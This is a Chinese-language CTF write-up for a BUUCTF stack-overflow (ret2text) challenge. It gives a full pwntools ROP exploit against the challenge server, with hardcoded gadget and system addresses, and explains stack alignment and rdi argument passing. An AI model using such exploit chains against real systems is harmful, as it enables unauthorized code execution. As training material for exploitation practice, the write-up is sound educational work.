一、题目信息

  • 题目来源：BUUCTF平台
  • 考点：栈溢出基础、ret2text
  • 环境：Ubuntu（64位)

二、解题思路

  1. 首先通过checksec查看程序保护机制，发现未开启NX保护；
  2. 放进IDA，找到main，算出覆盖需要64位“a”；
  3. 找到system函数-记住地址，在里面只发现了command，在command发现了cat flag-记住地址。
    4.开始写payload，

from pwn import *

io = remote(“node5.buuoj.cn”, 29094)

system_addr = 0x4004D0
cat_flag_addr = 0x400734
pop_rdi_ret = 0x400713
ret = 0x4004d1 # 替换成你找到的 ret 地址

payload = b”A” * 64
payload += p64(ret)
payload += p64(pop_rdi_ret)
payload += p64(cat_flag_addr)
payload += p64(system_addr)

io.send(payload)
io.interactive()

解析：
5.因为64 位程序在调用 system 时，栈必须 16 字节对齐，否则会直接崩溃，而
填充(64) + pop_rdi_ret(8) + cat_flag_addr(8) + system_addr(8)
总长度是 64 + 8 + 8 + 8 = 88 字节，88 % 16 = 8，没有对齐，
所以要加一个 ret 指令对齐栈，
ROPgadget –binary ./你的文件名 | grep “ret”
随便选一个ret
6.怎么找 pop rdi; ret 地址？
在终端里直接跑这行命令（把 你的二进制文件名 换成你实际的文件名，比如 warmup）：

ROPgadget –binary ./你的二进制文件名 | grep “pop rdi ; ret”
会得到类似这样的输出：0x00000000004011ea : pop rdi ; ret

你要让程序执行：
system(“cat flag.txt”);

但 64 位有个死规则：
函数的第一个参数 必须放在 rdi 寄存器里
第 1 行：pop rdi ; ret

payload += p64(0x400713) # pop rdi ; ret

作用：
从栈里拿一个值
塞进 rdi
然后 ret 继续执行下一个

第 2 行：cat_flag_addr（cat flag.txt 的地址）

payload += p64(0x400734)

作用：
这就是要放进 rdi 的参数
也就是 “cat flag.txt” 的地址

执行完第 1、2 行后：

rdi = 0x400734 → 等于 rdi = “cat flag.txt”

第 3 行：system_addr

payload += p64(0x4004D0)

作用：
跳到 system 函数
此时 rdi 已经是正确参数
所以系统执行：
plaintext
system(“cat flag.txt”)

三、要用gdb的话要在ida里面找地址然后直接在gdb设置断点，
找到main函数，开头设一个，
最后return设一个，这样程序不会立刻结束。
